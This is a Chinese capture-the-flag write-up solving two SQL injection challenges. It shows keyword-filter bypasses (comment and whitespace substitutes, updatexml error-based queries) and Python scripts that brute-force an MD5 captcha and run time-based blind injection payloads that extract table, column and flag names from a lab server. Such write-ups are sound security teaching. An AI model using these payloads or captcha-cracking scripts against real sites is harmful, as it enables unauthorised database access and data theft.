easy_sql 解题

此题有与上题相似的验证码机制，不再赘述。首先进行单引号测试：

可知同样为显错注入。进一步测试，发现过滤了一些关键词：

  • union
  • space(空格)
  • and
  • -
  • /
  • *

后台过滤了–与/*，但是并未过滤#，所以可使用%23(#)作为注释符。过滤空格后，我们可以使用回车(%0a)或tab(%09)作为分隔符。这两处过滤都比较容易绕过，但union关键字被过滤则使得联合查询无法使用。经过尝试，该处过滤无法使用大小写绕过，也不是简单的使用正则替换，也就封死了所有使用union关键字的路径。但经过学习，发现另一种构造查询语句的方法，即使用updatexml函数。updatexml的参数格式为： updatexml (XML_document, XPath_string, new_value) 。

  • XML_document为xml文档对象名，即要更新的对象
  • XPath_string为需要更新的xml路径，需要为XPath格式
  • new_value为新值

如果XPath_string参数不符合XPath的格式，函数就会报错，我们可以利用这个特性得到该参数的内容。所以只需在该参数中构造查询语句，就能拿到查询结果。与updatexml函数相似的还有extractvalue函数。具体应用可查看https://www.cnblogs.com/laoxiajiadeyun/p/10488731.html

normal_sql 解题

首先，该题的验证码机制与前述两题不同，该题要求code参数的md5散列值的前四位与所给值相同，使用Python脚本暴力破解即可得到：

def crackMd5(dst):
dst = dst.lower()
for a in range(0,10):
#print(a)
for b in range(0,10):
for c in range(0,10):
for d in range(0,10):
for e in range(0,10):
word = str(a) + str(b) + str(c) + str(d) + str(e)
m = hashlib.md5()
#print(word)
m.update(word.encode(“utf8”))
tmp = m.hexdigest()
#print(tmp[:4])
if dst == tmp[:4]:
return word
return None

出于破解的速度考虑，只尝试从00000到99999的十万种散列值，如果无法匹配则重新发送get请求得到新的要求值。使用如下的函数获取响应：

def getResponse(url):
pwd = None
while pwd is None:
s = requests.Session()
r = s.get(url)
code = r.text[-8:-4]
#print(code)
pwd = crackMd5(code)
url = url + “&code=” + pwd
print(url)
r = s.get(url)
return r.text

完成对验证码的操作后，对id参数进行测试，发现该题无错误回显，故判断为盲注，同时发现后台代码对一些关键字进行了过滤：

  • union
  • space
  • tab
  • linefeed
  • -
  • +
  • =
  • and

这里并未对#进行过滤，故可采用其作为注释符。过滤=后我们可以使用like替代，分隔符则使用/**/替代。经过测试发现难以找出使页面正常回显的payload，故采用延时盲注的方法进行测试：

这里响应时间明显长于正常时间，故可判断sleep(5)语句已被执行，即延时注入生效。在实际解题中，可适当增加延时的时间，避免因为crackMd5函数或网络原因造成的延时影响判断。不同于显错注入，盲注无法获得回显，只能根据是否延时判断是否满足条件。首先注出库名，编写Python脚本如下：

if __name__ == ‘__main__‘:
prefix = “http://test.evi0sdev.xyz:38003/?id=1'/\*\*/%26%26/\*\*/if((ascii(mid((select/\*\*/database()),1,1))/\*\*/like/\*\*/"
#the second parameter of mid function should be altered
suffix = “),sleep(100),1)%23”
for i in range(30,130):
url = prefix + str(i) + suffix
result = getResponse(url)
print(result)

因为对Python多线程编程的不熟悉，这里mid函数的第二个参数需要手动修改。在循环的过程中，如果在i的某个值处卡死，则说明该字符串的该处字符即为i值所表示的ascii码所对应的字符。照此方法修改prefix依次为

prefix = “http://test.evi0sdev.xyz:38003/?id=1'/\*\*/%26%26/\*\*/IF((ascii(mid((select/\*\*/group\_concat(table\_name)/\*\*/from/\*\*/information\_schema.tables/\*\*/where/\*\*/table\_schema/\*\*/like/\*\*/database()),1,1))/\*\*/like/\*\*/"
prefix = “http://test.evi0sdev.xyz:38003/?id=1'/\*\*/%26%26/\*\*/IF((ascii(mid((select/\*\*/group\_concat(column\_name)/\*\*/from/\*\*/information\_schema.columns/\*\*/where/\*\*/table\_name/\*\*/like/\*\*/'FIAG'),1,1))/\*\*/like/\*\*/"
#FIAG is the name of table
prefix = “http://test.evi0sdev.xyz:38003/?id=1'/\*\*/%26%26/\*\*/IF((ascii(mid((select/\*\*/group\_concat(FFFIIIAAAGGG)/\*\*/from/\*\*/FIAG/\*\*/),1,1))/\*\*/like/\*\*/"
#FFFIIIAAAGGG is the column name of FIAG table

则可依次注出表名，列名，字段名。

normal_sql 小结

盲注相对于显错注入最大的难度就在于需要一个字符一个字符地去尝试，注入点相对于显错注入也难以发现。上述代码在使用Python多线程之后会容易许多，后面有机会会予以更新。
